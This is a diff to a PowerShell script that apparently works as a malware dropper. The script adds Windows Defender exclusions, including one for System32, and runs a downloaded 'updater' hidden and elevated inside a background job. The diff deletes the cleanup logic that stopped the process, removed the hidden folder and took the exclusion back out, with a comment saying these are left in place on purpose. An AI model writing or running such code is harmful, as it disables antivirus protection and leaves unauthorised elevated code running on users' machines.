@@ -8,28 +8,13 @@ $runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Stri
 function Add-Exclusion { param([string]$Path)
     try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
 }
-function Remove-Exclusion { param([string]$Path)
-    try {
-        $exclusions = (Get-MpPreference).ExclusionPath
-        if ($exclusions -contains $Path) {
-            Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
-        }
-    } catch {}
-}
+# Removed Remove-Exclusion function as it is no longer needed
 
 Start-Job -ScriptBlock {
     param($downloadUrl, $updaterExe, $silentlyContinue, $stopAction, $runAs)
 
     function Add-Exclusion { param([string]$Path)
         try { Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue } catch {}
-    }
-    function Remove-Exclusion { param([string]$Path)
-        try {
-            $exclusions = (Get-MpPreference).ExclusionPath
-            if ($exclusions -contains $Path) {
-                Remove-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
-            }
-        } catch {}
     }
 
     Add-Exclusion -Path "C:\Windows\System32"
@@ -45,29 +30,9 @@ Start-Job -ScriptBlock {
         (Get-Item $hiddenFolder).Attributes += 'Hidden'
         (Get-Item $tempPath).Attributes += 'Hidden'
 
-        $proc = Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -PassThru
-        Start-Sleep -Seconds 5
+        # Start the updater but do NOT stop it later, nor delete folder, nor remove exclusion
+        Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs
 
-        $exeName = [System.IO.Path]::GetFileName($tempPath).ToLower()
-        Get-CimInstance Win32_Process | Where-Object {
-            ($_.Name -ieq $exeName) -and ($_.ExecutablePath -like "$hiddenFolder\*")
-        } | ForEach-Object {
-            try {
-                Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue
-            } catch {}
-        }
-
-        $maxAttempts = 10
-        $attempt = 0
-        while ((Test-Path $hiddenFolder) -and ($attempt -lt $maxAttempts)) {
-            try {
-                Remove-Item $hiddenFolder -Recurse -Force -ErrorAction Stop
-            } catch {}
-            Start-Sleep -Milliseconds 500
-            $attempt++
-        }
-
-        Remove-Exclusion -Path $hiddenFolder
     } catch {
         exit 1
     }
